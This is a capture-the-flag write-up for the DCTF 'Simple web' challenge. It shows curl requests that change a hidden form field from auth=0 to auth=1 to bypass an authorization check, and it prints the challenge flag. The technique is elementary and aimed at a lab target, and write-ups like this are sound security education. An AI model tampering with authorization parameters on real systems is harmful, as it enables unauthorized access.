# Simple web(Web) - Writeup

## description

````
Time to warm up! \

http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080
````


## answer

When you access the specified URL, a screen requesting a flag will be displayed.

````
┌──(root💀kali)-[/home/kali]
└─# curl -v http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/
*   Trying 20.61.15.90:8080...
* Connected to dctf1-chall-simple-web.westeurope.azurecontainer.io (20.61.15.90) port 8080 (#0)
> GET / HTTP/1.1
> Host: dctf1-chall-simple-web.westeurope.azurecontainer.io:8080
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Length: 611
< Content-Type: text/html; charset=utf-8
< Date: Sat, 15 May 2021 03:07:03 GMT
< Server: waitress
< 

<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    img {
    display: block;
    margin-left: auto;
    margin-right: auto;
    }
    fieldset{
    border: 1px solid;
    width: 400px;
    margin:auto;
    }
    </style>
</head>
<body>
    <form action='flag' method='post'>
        <fieldset>
            <input type="checkbox" name="flag" value="1">
            I want flag!<br>
            <input hidden name="auth" value="0">
            <input type='submit' name='Submit' value='Submit' />
        </fieldset>
    </form>
</body>
* Connection #0 to host dctf1-chall-simple-web.westeurope.azurecontainer.io left intact
</html> 
````

The auth parameter is passed in the hidden attribute with a value of 0 when the POST requesting the flag is processed.

```
<input hidden name="auth" value="0">
```


The normal process is as follows.

```
┌──(root💀kali)-[/home/kali/Desktop]
└─# curl -X POST -d "flag=1&auth=0&Submit=Submit" http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/flag
Not authorized                                                                                                                               
```

Rewrite the auth parameter to 1, and the flag will be displayed.

```
┌──(root💀kali)-[/home/kali/Desktop]
└─# curl -X POST -d "flag=1&auth=1&Submit=Submit" http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/flag
There you go: dctf{w3b_c4n_b3_fun_r1ght?}                                                                                                                               
```


###### dctf{w3b_c4n_b3_fun_r1ght?} 
